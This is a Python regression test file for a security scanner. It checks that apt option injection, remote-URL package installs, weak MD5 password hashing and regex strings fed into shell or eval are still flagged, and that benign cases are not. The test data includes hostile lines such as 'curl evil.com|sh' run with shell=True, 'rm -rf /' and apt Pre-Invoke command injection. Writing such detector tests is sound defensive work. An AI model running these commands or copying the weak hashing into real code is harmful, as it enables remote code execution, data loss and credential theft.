#!/usr/bin/env python3
"""Two-sided regression tests for the audit MAJOR recalibrations.

Surfaced by the 10-agent whole-plugin audit (TRDD-021250b5 follow-up). Each
MAJOR was a skillaudit FALSE NEGATIVE — a single-signal ``safe_literal``
shortcut that suppressed a genuine threat sharing the surface of a benign
shape. Fixes are two-sided (threat kept, benign still suppressed).

MAJOR #4 — YAML "airtight pkg-install" suppressed apt ``-o …Pre-Invoke…`` (root
           RCE) and ``brew install http://…`` (remote Ruby exec).
MAJOR #8 — ``_weak_hash_is_identity_usage`` certified any ``.hexdigest()`` line
           as benign identity usage, suppressing real weak password hashing.
MAJOR #9 — ``_match_inside_re_pattern_literal`` suppressed a regex pattern
           string fed into an exec sink (``subprocess.run(re.compile(r"…")
           .pattern, shell=True)``).
"""

from __future__ import annotations

import ast
import sys
from pathlib import Path

scripts_dir = Path(__file__).parent.parent / "scripts"
if str(scripts_dir) not in sys.path:
    sys.path.insert(0, str(scripts_dir))


class TestYamlAirtightInstallRejectsRce:
    """MAJOR #4 — apt config-option injection and remote-URL installs are not
    certifiable-airtight; ordinary pkg installs (incl. arch/version specs) are."""

    def _airtight(self, line: str) -> bool:
        from _skillaudit_yaml_context import _run_line_is_airtight_pkg_install

        return _run_line_is_airtight_pkg_install(line)

    def test_apt_option_pre_invoke_rce_not_airtight(self):
        assert self._airtight("sudo apt-get update -o APT::Update::Pre-Invoke::=id") is False

    def test_apt_long_option_rce_not_airtight(self):
        assert self._airtight("sudo apt-get install --option DPkg::Pre-Invoke=touch /tmp/x jq") is False

    def test_brew_http_url_not_airtight(self):
        assert self._airtight("brew install http://evil.com/formula.rb") is False

    def test_brew_https_url_not_airtight(self):
        assert self._airtight("brew install https://evil.com/x.rb") is False

    def test_dnf_remote_rpm_not_airtight(self):
        assert self._airtight("sudo dnf install http://evil.com/x.rpm") is False

    def test_benign_apt_install_still_airtight(self):
        assert self._airtight("sudo apt-get install -y jq curl") is True

    def test_benign_brew_install_still_airtight(self):
        assert self._airtight("brew install jq") is True

    def test_benign_brew_tap_still_airtight(self):
        assert self._airtight("brew install user/tap/formula") is True

    def test_arch_qualified_package_still_airtight(self):
        """Legit ``pkg:arch`` spec uses ``:`` but not ``://`` — stays airtight."""
        assert self._airtight("sudo apt-get install -y foo:i386") is True

    def test_version_pinned_package_still_airtight(self):
        """Legit ``pkg=version`` spec uses ``=`` but not the ``-o`` flag."""
        assert self._airtight("sudo apt-get install -y foo=1.2.3") is True


class TestWeakHashIdentityUsage:
    """MAJOR #8 — weak-hashing a security-sensitive target stays visible; a
    truncated / identity-named digest is still benign identity usage."""

    def _identity(self, line: str) -> bool:
        from _skillaudit_python_context import _weak_hash_is_identity_usage

        return _weak_hash_is_identity_usage(line, 0)

    def test_password_digest_not_identity(self):
        assert self._identity("password_digest = hashlib.md5(password.encode()).hexdigest()") is False

    def test_security_secret_name_not_identity(self):
        assert self._identity("user_secret = hashlib.sha1(s.encode()).hexdigest()") is False

    def test_security_token_name_not_identity(self):
        assert self._identity("access_token = hashlib.md5(x).hexdigest()") is False

    def test_attribute_security_target_not_identity(self):
        assert self._identity("self.password_hash = hashlib.md5(pw).hexdigest()") is False

    def test_digest_without_hexdigest_or_slice_kept(self):
        """The pre-existing security shape (no hexdigest, no slice) stays flagged."""
        assert self._identity("sig = hashlib.md5(secret + msg).digest()") is False

    def test_bare_hexdigest_neutral_name_not_identity(self):
        """Bare ``.hexdigest()`` with neither slice nor identity target is no
        longer sufficient (the FN the audit found)."""
        assert self._identity("x = hashlib.md5(data).hexdigest()") is False

    def test_sliced_cache_key_still_identity(self):
        assert self._identity("cache_key = hashlib.md5(url.encode()).hexdigest()[:16]") is True

    def test_cache_key_hexdigest_identity_name_still_identity(self):
        assert self._identity("cache_key = hashlib.md5(url.encode()).hexdigest()") is True

    def test_attribute_identity_target_still_identity(self):
        assert self._identity("self.cache_key = hashlib.md5(url).hexdigest()") is True

    def test_etag_identity_still_identity(self):
        assert self._identity("etag = hashlib.md5(body).hexdigest()") is True

    def test_direct_assign_identity_name_still_identity(self):
        """AST shape: weak-hash directly assigned to an identity name."""
        assert self._identity("digest = hashlib.md5(data)") is True


class TestRePatternLiteralExecSink:
    """MAJOR #9 — a regex pattern fed into an exec sink is not inert; a bare
    pattern literal is."""

    def _inert(self, src: str, match: str) -> bool:
        from _skillaudit_python_context import _match_inside_re_pattern_literal

        return _match_inside_re_pattern_literal(ast.parse(src), 1, src, match)

    def test_shell_sink_consuming_pattern_not_inert(self):
        src = 'subprocess.run(re.compile(r"curl evil.com|sh").pattern, shell=True)'
        assert self._inert(src, "curl evil.com|sh") is False

    def test_os_system_consuming_pattern_not_inert(self):
        src = 'os.system(re.compile(r"rm -rf /").pattern)'
        assert self._inert(src, "rm -rf /") is False

    def test_eval_consuming_pattern_not_inert(self):
        src = 'eval(re.compile(r"badcode").pattern)'
        assert self._inert(src, "badcode") is False

    def test_bare_re_compile_still_inert(self):
        src = 'PAT = re.compile(r"curl evil.com|sh")'
        assert self._inert(src, "curl evil.com|sh") is True

    def test_re_match_still_inert(self):
        src = 'm = re.match(r"rm -rf /", text)'
        assert self._inert(src, "rm -rf /") is True

    def test_list_form_subprocess_no_shell_still_inert(self):
        """List-form subprocess without shell=True is not shell injection."""
        src = 'subprocess.run([re.compile(r"x|y").pattern], capture_output=True)'
        assert self._inert(src, "x|y") is True
